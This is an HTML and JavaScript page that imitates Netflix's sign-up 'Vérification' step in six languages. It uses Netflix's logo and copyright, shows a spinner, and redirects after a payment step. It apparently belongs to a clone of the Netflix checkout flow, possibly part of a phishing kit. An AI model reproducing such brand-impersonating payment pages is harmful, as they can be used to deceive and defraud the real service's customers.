<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="pageTitle">Vérification - Netflix</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            color: #333;
            background: #f3f3f3;
            line-height: 1.6;
        }

        .header {
            padding: 20px 5%;
            border-bottom: 1px solid #e6e6e6;
            background: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            height: 45px;
        }

        .language-selector {
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 7px 30px 7px 12px;
            border: 1px solid #777;
            border-radius: 3px;
            font-size: 14px;
            appearance: none;
            -webkit-appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 8px center;
            background-size: 12px;
        }

        .progress-bar {
            display: flex;
            justify-content: center;
            padding: 15px 0;
            background: #f3f3f3;
        }

        .progress-step {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 0 20px;
            position: relative;
        }

        .progress-step:not(:last-child)::after {
            content: '';
            position: absolute;
            top: 20px;
            left: 50px;
            width: 100px;
            height: 1px;
            background: #ccc;
        }

        .step-number {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #e50914;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .step-label {
            font-size: 14px;
            color: #333;
        }

        .container {
            max-width: 1100px;
            margin: 30px auto;
            padding: 0 20px;
        }

        .verification-container {
            background: white;
            border-radius: 4px;
            padding: 30px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .page-title {
            text-align: center;
            margin-bottom: 20px;
            font-size: 28px;
            font-weight: 500;
        }

        .verification-message {
            color: #737373;
            margin-bottom: 25px;
            font-size: 15px;
            text-align: center;
        }

        .sms-code-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 30px;
        }

        .sms-code-input {
            background: #f3f3f3;
            border: 1px solid #ccc;
            border-radius: 4px;
            color: #333;
            height: 60px;
            width: 50px;
            font-size: 24px;
            text-align: center;
            padding: 0;
        }

        .submit-button {
            width: 100%;
            padding: 14px;
            background: #e50914;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }

        .submit-button:hover {
            background: #f6121d;
        }

        .help-text {
            color: #737373;
            font-size: 13px;
            text-align: center;
            margin-top: 20px;
        }

        .help-link {
            color: #737373;
            text-decoration: none;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        .resend-code {
            color: #737373;
            font-size: 13px;
            text-align: center;
            margin-top: 25px;
        }

        .resend-link {
            color: #e50914;
            text-decoration: none;
            font-weight: 500;
        }

        .resend-link:hover {
            text-decoration: underline;
        }

        .footer {
            background: #f3f3f3;
            padding: 30px 5%;
            border-top: 1px solid #e6e6e6;
            margin-top: 50px;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .footer-link {
            color: #737373;
            text-decoration: none;
            font-size: 13px;
        }

        .footer-link:hover {
            text-decoration: underline;
        }

        .footer-text {
            text-align: center;
            color: #737373;
            font-size: 13px;
        }

        .selected-plan-display {
            text-align: center;
            color: #e50914;
            font-weight: bold;
            margin-bottom: 20px;
            font-size: 16px;
        }

        .spinner-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 20px 0;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #e50914;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-message {
            text-align: center;
            margin: 10px 0;
            color: #737373;
        }
    </style>
</head>
<body>
    <header class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo">
        <select class="language-selector" id="languageSelector">
            <option value="fr">Français</option>
            <option value="en">English</option>
            <option value="es">Español</option>
            <option value="de">Deutsch</option>
            <option value="ru">Русский</option>
            <option value="pl">Polski</option>
        </select>
    </header>

    <div class="progress-bar">
        <div class="progress-step">
            <div class="step-number">1</div>
            <div class="step-label" id="step1Label">Choix de l'offre</div>
        </div>
        <div class="progress-step">
            <div class="step-number">2</div>
            <div class="step-label" id="step2Label">Paiement</div>
        </div>
        <div class="progress-step">
            <div class="step-number">3</div>
            <div class="step-label" id="step3Label">Vérification</div>
        </div>
    </div>

    <div class="container">
        <div class="verification-container">
            <h1 class="page-title" id="heading">Vérification</h1>
            
            <div class="selected-plan-display" id="chosenPlanText"></div>
            
            <div class="spinner-container" id="spinnerContainer">
                <div class="spinner"></div>
                <div class="status-message" id="verifyingMsg">Nous vérifions votre abonnement... veuillez patienter.</div>
                <div class="status-message" id="redirectMsg">Redirection dans 5 s...</div>
            </div>
            
            <div id="noPlanSelected" style="display: none; text-align: center;">
                <div class="verification-message">Aucune offre sélectionnée</div>
                <a href="paiement.html" class="submit-button" id="backToPlans">Retour au choix de l'offre</a>
            </div>

            <footer class="footer">
                <div class="footer-links">
                    <a href="#" class="footer-link" id="termsLink">Conditions d'utilisation</a>
                    <a href="#" class="footer-link" id="privacyLink">Confidentialité</a>
                    <a href="#" class="footer-link" id="legalLink">Mentions légales</a>
                    <a href="#" class="footer-link" id="cookiesLink">Préférences de cookies</a>
                </div>
                <p class="footer-text" id="copyrightText">© 2025 Netflix, Inc.</p>
            </footer>
        </div>
    </div>

    <script>
        // Traductions multilingues complètes
        const translations = {
            fr: {
                pageTitle: "Vérification - Netflix",
                heading: "Vérification",
                step1: "Choix de l'offre",
                step2: "Paiement",
                step3: "Vérification",
                selectedPlanPrefix: "Offre choisie : ",
                verifyingMsg: "Nous vérifions votre abonnement... veuillez patienter.",
                redirectMsg: "Redirection dans 5 s...",
                backToPlans: "Retour au choix de l'offre",
                terms: "Conditions d'utilisation",
                privacy: "Confidentialité",
                legal: "Mentions légales",
                cookies: "Préférences de cookies",
                copyright: "© 2025 Netflix, Inc.",
                noPlanSelected: "Aucune offre sélectionnée"
            },
            en: {
                pageTitle: "Verification - Netflix",
                heading: "Verification",
                step1: "Choose plan",
                step2: "Payment",
                step3: "Verification",
                selectedPlanPrefix: "Selected plan: ",
                verifyingMsg: "We're verifying your subscription... please wait.",
                redirectMsg: "Redirecting in 5 s...",
                backToPlans: "Back to plan selection",
                terms: "Terms of Use",
                privacy: "Privacy",
                legal: "Legal Notices",
                cookies: "Cookie Preferences",
                copyright: "© 2025 Netflix, Inc.",
                noPlanSelected: "No plan selected"
            },
            es: {
                pageTitle: "Verificación - Netflix",
                heading: "Verificación",
                step1: "Elegir plan",
                step2: "Pago",
                step3: "Verificación",
                selectedPlanPrefix: "Plan seleccionado: ",
                verifyingMsg: "Estamos verificando tu suscripción... por favor espera.",
                redirectMsg: "Redireccionando en 5 s...",
                backToPlans: "Volver a selección de plan",
                terms: "Términos de uso",
                privacy: "Privacidad",
                legal: "Avisos legales",
                cookies: "Preferencias de cookies",
                copyright: "© 2025 Netflix, Inc.",
                noPlanSelected: "Ningún plan seleccionado"
            },
            de: {
                pageTitle: "Verifizierung - Netflix",
                heading: "Verifizierung",
                step1: "Plan wählen",
                step2: "Zahlung",
                step3: "Verifizierung",
                selectedPlanPrefix: "Ausgewählter Plan: ",
                verifyingMsg: "Wir überprüfen Ihr Abonnement... bitte warten.",
                redirectMsg: "Weiterleitung in 5 s...",
                backToPlans: "Zurück zur Planauswahl",
                terms: "Nutzungsbedingungen",
                privacy: "Datenschutz",
                legal: "Rechtliche Hinweise",
                cookies: "Cookie-Einstellungen",
                copyright: "© 2025 Netflix, Inc.",
                noPlanSelected: "Kein Plan ausgewählt"
            },
            ru: {
                pageTitle: "Проверка - Netflix",
                heading: "Проверка",
                step1: "Выбор тарифа",
                step2: "Оплата",
                step3: "Проверка",
                selectedPlanPrefix: "Выбранный тариф: ",
                verifyingMsg: "Проверяем вашу подписку... пожалуйста, подождите.",
                redirectMsg: "Перенаправление через 5 с...",
                backToPlans: "Вернуться к выбору тарифа",
                terms: "Условия использования",
                privacy: "Конфиденциальность",
                legal: "Юридические уведомления",
                cookies: "Настройки cookie",
                copyright: "© 2025 Netflix, Inc.",
                noPlanSelected: "Тариф не выбран"
            },
            pl: {
                pageTitle: "Weryfikacja - Netflix",
                heading: "Weryfikacja",
                step1: "Wybór planu",
                step2: "Płatność",
                step3: "Weryfikacja",
                selectedPlanPrefix: "Wybrany plan: ",
                verifyingMsg: "Weryfikujemy Twoją subskrypcję... proszę czekać.",
                redirectMsg: "Przekierowanie za 5 s...",
                backToPlans: "Powrót do wyboru planu",
                terms: "Warunki korzystania",
                privacy: "Prywatność",
                legal: "Informacje prawne",
                cookies: "Preferencje dotyczące plików cookie",
                copyright: "© 2025 Netflix, Inc.",
                noPlanSelected: "Nie wybrano planu"
            }
        };

        const monthlySuffix = {
            fr: "/mois",
            en: "/month",
            es: "/mes",
            de: "/Monat",
            ru: "/месяц",
            pl: "/miesiąc"
        };

        // Mapping des IDs aux clés de traduction
        const idMap = {
            'pageTitle': 'pageTitle',
            'heading': 'heading',
            'step1Label': 'step1',
            'step2Label': 'step2',
            'step3Label': 'step3',
            'verifyingMsg': 'verifyingMsg',
            'redirectMsg': 'redirectMsg',
            'backToPlans': 'backToPlans',
            'termsLink': 'terms',
            'privacyLink': 'privacy',
            'legalLink': 'legal',
            'cookiesLink': 'cookies',
            'copyrightText': 'copyright'
        };

        function getLanguage() {
            const urlParams = new URLSearchParams(window.location.search);
            const langParam = urlParams.get('lang');
            
            if (langParam && translations[langParam]) {
                localStorage.setItem('netflixLang', langParam);
                return langParam;
            }
            
            return localStorage.getItem('netflixLang') || 'fr';
        }

        function updateLanguage(lang) {
            const trans = translations[lang];
            if (!trans) return;
            
            // Mise à jour de tous les éléments avec ID mappés
            Object.keys(idMap).forEach(id => {
                const element = document.getElementById(id);
                if (element) {
                    element.textContent = trans[idMap[id]];
                }
            });
            
            // Mise à jour du sélecteur de langue
            const languageSelector = document.getElementById('languageSelector');
            if (languageSelector) {
                languageSelector.value = lang;
            }
            
            // Mise à jour du titre de la page et de la langue HTML
            document.title = trans.pageTitle;
            document.documentElement.lang = lang;
            
            // Mise à jour de l'affichage du plan sélectionné
            updateSelectedPlanDisplay(lang);
        }

        function updateSelectedPlanDisplay(lang) {
            const selectedPlanDisplay = document.getElementById('chosenPlanText');
            const noPlanSelectedDiv = document.getElementById('noPlanSelected');
            const spinnerContainer = document.getElementById('spinnerContainer');
            
            const planData = localStorage.getItem('netflixSelectedPlan');
            
            if (planData) {
                try {
                    const plan = JSON.parse(planData);
                    const trans = translations[lang] || translations.fr;
                    
                    selectedPlanDisplay.textContent = 
                        trans.selectedPlanPrefix + 
                        plan.planName + " - " + 
                        plan.planPrice + " " + 
                        monthlySuffix[lang];
                    
                    selectedPlanDisplay.style.display = 'block';
                    noPlanSelectedDiv.style.display = 'none';
                    spinnerContainer.style.display = 'flex';
                    
                    // Démarrer la redirection après 5 secondes
                    startRedirectionTimer();
                } catch (e) {
                    console.error('Error parsing plan data:', e);
                    showNoPlanSelected(lang);
                }
            } else {
                showNoPlanSelected(lang);
            }
        }

        function showNoPlanSelected(lang) {
            const selectedPlanDisplay = document.getElementById('chosenPlanText');
            const noPlanSelectedDiv = document.getElementById('noPlanSelected');
            const spinnerContainer = document.getElementById('spinnerContainer');
            const trans = translations[lang] || translations.fr;
            
            selectedPlanDisplay.style.display = 'none';
            noPlanSelectedDiv.style.display = 'block';
            spinnerContainer.style.display = 'none';
            
            document.getElementById('noPlanSelected').querySelector('.verification-message').textContent = 
                trans.noPlanSelected || "Aucune offre sélectionnée";
        }

        function startRedirectionTimer() {
            const redirectMsg = document.getElementById('redirectMsg');
            let secondsLeft = 5;
            
            const countdown = setInterval(() => {
                secondsLeft--;
                
                const lang = getLanguage();
                const trans = translations[lang] || translations.fr;
                
                redirectMsg.textContent = trans.redirectMsg.replace('5', secondsLeft);
                
                if (secondsLeft <= 0) {
                    clearInterval(countdown);
                    window.location.href = "success.html";
                }
            }, 1000);
        }

        document.addEventListener('DOMContentLoaded', function() {
            const lang = getLanguage();
            updateLanguage(lang);
            
            const languageSelector = document.getElementById('languageSelector');
            if (languageSelector) {
                languageSelector.addEventListener('change', function() {
                    const newLang = this.value;
                    localStorage.setItem('netflixLang', newLang);
                    updateLanguage(newLang);
                });
            }
        });
    </script>
</body>
</html>
